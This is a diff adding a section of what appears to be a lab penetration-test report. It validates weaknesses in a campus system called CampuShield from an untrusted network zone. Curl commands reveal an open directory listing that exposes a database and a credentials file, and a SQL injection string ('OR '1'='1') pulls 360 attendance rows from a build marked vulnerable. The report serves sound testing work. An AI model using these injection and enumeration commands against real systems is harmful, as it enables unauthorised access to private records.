@@ -1,0 +1,24 @@
+
+### 4. Non-destructive validation of the weaknesses
+4a. Backup share: is directory listing enabled and is the database downloadable?
+
+$ ip netns exec cs_untrusted curl -s http://10.10.50.1:8000/ | grep -o 'href="[^"]*"'
+href="campushield.db"
+href="lab_credentials.txt"
+Only the response headers are requested (HEAD) - no file contents are downloaded:
+
+$ ip netns exec cs_untrusted curl -sI http://10.10.50.1:8000/campushield.db
+HTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/3.14.10
+Date: Thu, 19 Nov 2026 23:07:33 GMT
+Content-type: application/octet-stream
+Content-Length: 61440
+Last-Modified: Thu, 19 Nov 2026 23:07:23 GMT
+
+msfconsole not installed - validation above uses curl/nmap only.
+
+4c. SQL injection reachable from the unauthorised zone (student account, vulnerable build)
+login s2026001 from 10.10.50.66 -> HTTP 302
+
+$ ip netns exec cs_untrusted curl -s -b /tmp/tmp.L57NCa613p -G --data-urlencode "course=BCS210' OR '1'='1" http://10.10.50.1:5000/attendance | grep -o '[0-9]* row(s) returned'
+360 row(s) returned
